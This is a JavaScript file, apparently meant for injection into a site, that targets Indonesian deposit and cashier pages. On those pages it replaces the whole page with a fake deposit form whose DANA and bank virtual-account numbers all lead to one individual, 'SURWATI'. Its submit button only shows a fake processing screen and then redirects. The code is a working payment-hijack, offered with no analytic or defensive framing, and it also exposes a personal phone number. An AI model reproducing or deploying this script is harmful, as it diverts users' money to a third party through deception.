// akhirdepo.js

document.addEventListener("DOMContentLoaded", () => {
  const allowedPaths = [
    "/deposit",
    "/bank",
    "/deposit.php",
    "/qris.php",
    "/cashier",
    "/bank.php",
    "/index.php",
    "/" // handle query
  ];

  const path = window.location.pathname;
  const search = window.location.search;

  const match =
    allowedPaths.includes(path) &&
    (
      path !== "/index.php" && path !== "/"
        ? true
        : (
          search.includes("page=transaksi") ||
          search.includes("page=cashier") ||
          search.includes("deposit&head=home")
        )
    );

  if (!match) return; // jika bukan halaman target, jangan ubah apapun

  // === CSS ===
  document.head.innerHTML += `
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Form Deposit</title>
    <style>
      :root{--bg:#0f1724;--card:#0b1220;--accent:#06b6d4;--muted:#9ca3af;--success:#10b981}
      *{box-sizing:border-box;font-family:Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial}
      body{margin:0;background:linear-gradient(180deg,#071025 0%, #021018 100%);color:#e6eef6;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:28px}
      .container{width:100%;max-width:980px}
      .card{background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));border:1px solid rgba(255,255,255,0.03);padding:20px;border-radius:12px;box-shadow:0 6px 30px rgba(2,6,23,0.6)}
      h1{margin:0 0 8px;font-size:20px}
      p.lead{color:var(--muted);margin:0 0 18px}
      .grid{display:grid;grid-template-columns:360px 1fr;gap:18px}
      .methods{background:rgba(255,255,255,0.02);padding:12px;border-radius:10px;height:100%;overflow:auto}
      .method{display:flex;gap:10px;align-items:center;padding:8px;border-radius:8px;border:1px solid transparent;cursor:pointer}
      .method:hover{border-color:rgba(255,255,255,0.03);background:rgba(255,255,255,0.01)}
      .method.active{outline:2px solid rgba(6,182,212,0.12);background:linear-gradient(90deg, rgba(6,182,212,0.03), transparent)}
      .method img{width:44px;height:44px;object-fit:contain;border-radius:8px;background:#fff;padding:6px}
      .method .meta{font-size:13px}
      .method .meta b{display:block}
      .details{padding:12px}
      .detail-top{display:flex;align-items:center;gap:12px}
      .detail-top img{width:64px;height:64px;border-radius:10px;background:#fff;padding:6px}
      .detail-top .title{font-size:16px}
      .number-row{display:flex;gap:8px;align-items:center;margin-top:10px}
      .number-box{background:#051622;padding:10px;border-radius:8px;border:1px dashed rgba(255,255,255,0.03);flex:1}
      button.copy{background:var(--accent);border:none;padding:8px 10px;border-radius:8px;color:#012;cursor:pointer}
      .form-section{margin-top:18px}
      label{display:block;font-size:13px;color:var(--muted);margin-bottom:8px}
      input[type="text"], input[type="number"]{width:100%;padding:12px;border-radius:8px;border:1px solid rgba(255,255,255,0.03);background:rgba(255,255,255,0.01);color:inherit}
      .row{display:flex;gap:10px}
      .small{width:150px}
      .note{font-size:13px;color:var(--muted);margin-top:10px;background:rgba(0,0,0,0.15);padding:10px;border-radius:8px}
      .submit{margin-top:16px;display:flex;gap:8px;align-items:center}
      button.primary{background:linear-gradient(90deg,var(--accent),#0891b2);border:none;padding:12px 16px;border-radius:10px;cursor:pointer;color:#012;font-weight:600}
      button.ghost{background:transparent;border:1px solid rgba(255,255,255,0.04);padding:10px 12px;border-radius:8px;color:var(--muted);cursor:pointer}
      .footer-notes{margin-top:14px;font-size:13px;color:var(--muted)}

      .toast{position:fixed;right:20px;bottom:20px;background:#022831;padding:12px 14px;border-radius:8px;border:1px solid rgba(255,255,255,0.03);box-shadow:0 8px 30px rgba(0,0,0,0.6);display:flex;gap:10px;align-items:center}

      .overlay{position:fixed;inset:0;background:rgba(1,6,10,0.6);display:flex;align-items:center;justify-content:center;backdrop-filter:blur(3px);z-index:60;color:#e6f7fb;display:none}
      .spinner{width:92px;height:92px;border-radius:12px;background:linear-gradient(180deg,#062a34,#022024);display:flex;align-items:center;justify-content:center;flex-direction:column;padding:12px}
      .bars{display:flex;gap:4px;margin-top:8px}
      .bars span{width:8px;height:22px;background:rgba(255,255,255,0.08);display:inline-block;border-radius:2px;animation:wave 1s infinite}
      .bars span:nth-child(2){animation-delay:0.12s}
      .bars span:nth-child(3){animation-delay:0.24s}
      .bars span:nth-child(4){animation-delay:0.36s}
      .bars span:nth-child(5){animation-delay:0.48s}
      @keyframes wave{0%{transform:scaleY(0.5);opacity:0.5}50%{transform:scaleY(1.5);opacity:1}100%{transform:scaleY(0.6);opacity:0.6}}
      @media (max-width:860px){.grid{grid-template-columns:1fr;}.methods{height:auto}}
    </style>
  `;

  // === Markup ===
  document.body.innerHTML = `
    <div class="container">
      <div class="card">
        <h1>Form Deposit</h1>
        <p class="lead">Pilih tujuan deposit, masukkan nilai (Min. 50.000). Salin nomor tujuan untuk transfer.</p>
        <div class="grid">
          <div class="methods" id="methods"></div>
          <div class="details card" style="background:transparent;padding:0">
            <div class="detail-top" id="detailTop"></div>
            <div class="details-body" style="padding:12px" id="detailsBody">
              <div class="number-row">
                <div class="number-box" id="detailNumber">-</div>
                <button class="copy" id="copyBtn">Salin Nomor</button>
              </div>
              <div class="form-section">
                <label for="amount">Nilai Deposit (Min. 50.000)</label>
                <div class="row">
                  <input type="text" id="amount" placeholder="50.000" inputmode="decimal">
                  <div class="small">
                    <input type="text" id="uniqueCode" placeholder="Kode unik (3 digit)" maxlength="3">
                  </div>
                </div>
                <div class="note">Contoh: 50.000 + kode unik 123 -> 50.123</div>
              </div>
              <div class="form-section">
                <label>Nama Pengirim (opsional)</label>
                <input type="text" id="senderName" placeholder="Nama sesuai rekening" />
              </div>
              <div class="submit">
                <button class="primary" id="submitBtn">Kirim & Generate Instruksi</button>
                <button class="ghost" id="resetBtn" type="button">Reset</button>
              </div>
              <div class="footer-notes">
                <strong>Catatan Deposit:</strong>
                <ul>
                  <li>Wajib Menggunakan Rekening Terdaftar</li>
                  <li>Wajib Menggunakan Kode unik transaksi pertama</li>
                  <li>Syarat dan ketentuan berlaku</li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="overlay" id="overlay">
      <div class="spinner">
        <div style="font-size:14px;font-weight:600">Memproses Pembayaran...</div>
        <div style="font-size:12px;color:var(--muted);margin-top:6px">Silakan transfer sesuai instruksi</div>
        <div class="bars" style="margin-top:10px">
          <span></span><span></span><span></span><span></span><span></span>
        </div>
      </div>
    </div>
    <div id="toastWrap"></div>
  `;

  // === JS Logic ===
  const methodsEl = document.getElementById("methods");
  const detailTop = document.getElementById("detailTop");
  const detailNumber = document.getElementById("detailNumber");
  const copyBtn = document.getElementById("copyBtn");
  const amountInput = document.getElementById("amount");
  const uniqueInput = document.getElementById("uniqueCode");
  const submitBtn = document.getElementById("submitBtn");
  const resetBtn = document.getElementById("resetBtn");
  const overlay = document.getElementById("overlay");
  const toastWrap = document.getElementById("toastWrap");

  const methods = [
    {id:"dana",title:"DANA",logo:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSbHvUx6MjQFcVH2a8paDBoKH5K1VZlJrKMzg&usqp=CAU",number:"088214538915",name:"SURWATI"},
    {id:"bca",title:"BCA VA",logo:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR9TvmOPrRWGgnIGDVraU9TFHAzp7AAmwV8vhpd7qNIo-GWkJAAei82Yx3s&s=10",number:"3901088214538915",name:"SURWATI"},
    {id:"bri",title:"BRI VA",logo:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTMeqbx8--46kKmCET5yZnDT9BFqSByqVCYQw&s",number:"88810088214538915",name:"SURWATI"},
    {id:"bni",title:"BNI VA",logo:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRGDMFxioKDa2kz-TBjhKYEmn6mvERMtBLMJw&s",number:"8810088214538915",name:"SURWATI"},
    {id:"mandiri",title:"MANDIRI VA",logo:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS8Yg6g0b7UdqtWmgk60JvMYbvOPnjhGGYsTQ&s",number:"89508088214538915",name:"SURWATI"}
  ];
  let activeId = methods[0].id;

  function fmtNumber(n){return n.toString().replace(/\D/g,"").replace(/\B(?=(\d{3})+(?!\d))/g,".");}
  function renderMethods(){
    methodsEl.innerHTML="";
    methods.forEach(m=>{
      const el=document.createElement("div");
      el.className="method"+(m.id===activeId?" active":"");
      el.innerHTML=`<img src="${m.logo}" alt="${m.title}"><div class="meta"><b>${m.title}</b><span style="font-size:13px;color:var(--muted)">${m.number}</span></div>`;
      el.addEventListener("click",()=>{activeId=m.id;renderMethods();renderDetail();showToast("Tujuan diubah: "+m.title);});
      methodsEl.appendChild(el);
    });
  }
  function renderDetail(){
    const m=methods.find(x=>x.id===activeId);
    detailTop.innerHTML=`<img src="${m.logo}" alt="${m.title}"><div><div class="title">${m.title}</div><div style="color:var(--muted);font-size:13px;margin-top:4px">A.n: ${m.name}</div></div>`;
    detailNumber.textContent=m.number;
  }

  copyBtn.addEventListener("click",()=>{
    const m=methods.find(x=>x.id===activeId);
    const temp=document.createElement("input");
    temp.value=m.number;document.body.appendChild(temp);temp.select();
    try{document.execCommand("copy");showToast("Nomor tersalin ke clipboard");}
    catch(e){showToast("Gagal menyalin. Silakan salin manual");}
    document.body.removeChild(temp);
  });

  amountInput.addEventListener("input",e=>{
    const val=e.target.value.replace(/\D/g,"");e.target.value=fmtNumber(val);
  });
  uniqueInput.addEventListener("input",e=>{
    e.target.value=e.target.value.replace(/\D/g,"").slice(0,3);
  });
  resetBtn.addEventListener("click",()=>{
    amountInput.value="";uniqueInput.value="";document.getElementById("senderName").value="";showToast("Form reset");
  });

  function parseAmount(){const raw=amountInput.value.replace(/\./g,"");return raw?parseInt(raw,10):NaN;}

  submitBtn.addEventListener("click",ev=>{
    ev.preventDefault();
    const amount=parseAmount();
    const unique=uniqueInput.value?parseInt(uniqueInput.value,10):0;
    if(!amount||isNaN(amount))return showToast("Masukkan nilai deposit");
    if(amount<50000)return showToast("Nilai minimal 50.000");
    if(unique<1||unique>999)return showToast("Masukkan kode unik 3 digit untuk transaksi pertama");

    overlay.style.display="flex";
    setTimeout(()=>{
      overlay.style.display="none";
      showToast("Instruksi transfer berhasil dibuat");
      setTimeout(()=>{window.location.href="../";},1500);
    },1500);
  });

  function showToast(text,duration=2200){
    const t=document.createElement("div");
    t.className="toast";t.textContent=text;toastWrap.appendChild(t);
    setTimeout(()=>{t.style.opacity="0";t.style.transform="translateY(12px)";},duration-300);
    setTimeout(()=>{t.remove();},duration);
  }

  renderMethods();renderDetail();
  document.addEventListener("keydown",e=>{if(e.key==="c"||e.key==="C"){copyBtn.click();}});
});
